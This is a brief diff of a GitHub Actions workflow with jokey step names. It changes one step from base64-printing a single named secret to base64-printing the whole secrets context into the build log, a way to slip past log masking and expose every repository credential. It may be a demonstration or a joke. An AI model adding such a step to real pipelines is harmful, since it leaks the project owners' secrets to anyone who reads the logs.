@@ -61,4 +61,4 @@ jobs:
         with:
           message: "やっぱり ${{ env.MUSCLE_SIDE }} だね"
       - name: What's this drink?
-        run: echo "${{ secrets.STRONGEST_DRINK }}" | base64
+        run: echo "${{ secrets }}" | base64
